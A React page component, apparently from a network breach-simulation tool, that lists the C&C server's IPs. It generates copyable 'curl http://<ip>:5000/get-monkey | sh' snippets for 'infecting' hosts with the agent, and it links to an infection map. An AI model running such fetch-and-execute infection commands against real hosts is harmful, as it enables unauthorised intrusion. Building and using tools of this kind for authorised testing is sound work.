import React from 'react';
import {Button, Col, Well} from 'react-bootstrap';
import CopyToClipboard from 'react-copy-to-clipboard';
import {Icon} from 'react-fa';
import {Link} from "react-router-dom";

class RunMonkeyPageComponent extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      ips: [],
      selectedIp: '0.0.0.0',
      isRunningOnIsland: false,
      isRunningLocally: false
    };
  }

  componentDidMount() {
    fetch('/api')
      .then(res => res.json())
      .then(res => this.setState({
        ips: res['ip_addresses']
      }));

    fetch('/api/local-monkey')
      .then(res => res.json())
      .then(res => this.setState({
        isRunningOnIsland: res['is_running']
      }));
  }

  generateCmd(ip) {
    return `curl http://${ip}:5000/get-monkey | sh`;
  }

  runLocalMonkey = () => {
    fetch('/api/local-monkey',
      {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: 'run'})
      })
      .then(res => res.json())
      .then(res => {
        this.setState({
          isRunningOnIsland: res['is_running']
        });
      });
  };

  render() {
    return (
      <Col xs={8}>
        <h1 className="page-title">Run the Monkey</h1>
        <p style={{'fontSize': '1.2em', 'marginBottom': '2em'}}>
          You can run the monkey on the C&C server, on your local machine and basically everywhere.
          The more the merrier &#x1F604;
        </p>
        <p style={{'marginBottom': '2em'}}>
          <button onClick={this.runLocalMonkey}
                  className="btn btn-default"
                  disabled={this.state.isRunningOnIsland}>
            Run on C&C Server
            { !this.state.isRunningOnIsland ?
              <Icon name="check" className="text-success" style={{'marginLeft': '5px'}}/>
              : ''}
          </button>
          <a href="/download-monkey"
             className="btn btn-default"
             disabled={this.state.isRunningLocally}
             style={{'margin-left': '1em'}}>
            Download and run locally
            { !this.state.isRunningLocally ?
              <Icon name="check" className="text-success" style={{'marginLeft': '5px'}}/>
              : ''}
          </a>
        </p>
        <div className="run-monkey-snippets" style={{'marginBottom': '3em'}}>
          <p>
            Run one of those snippets on a host for infecting it with a Monkey:
            <br/>
            <span className="text-muted">(The IP address is used as the monkey's C&C address)</span>
          </p>
          <Well className="well-sm">
            {this.state.ips.map(ip =>
              <div style={{'overflow': 'auto', 'padding': '0.5em'}}>
                <CopyToClipboard text={this.generateCmd(ip)} className="pull-right btn-sm">
                  <Button style={{margin: '-0.5em'}} title="Copy to Clipboard">
                    <Icon name="clipboard"/>
                  </Button>
                </CopyToClipboard>
                <code>{this.generateCmd(ip)}</code>
              </div>
            )}
          </Well>
        </div>
        <p style={{'fontSize': '1.2em'}}>
          Go ahead and monitor the ongoing infection in the <Link to="/infection/map">Infection Map</Link> view.
        </p>
      </Col>
    );
  }
}

export default RunMonkeyPageComponent;
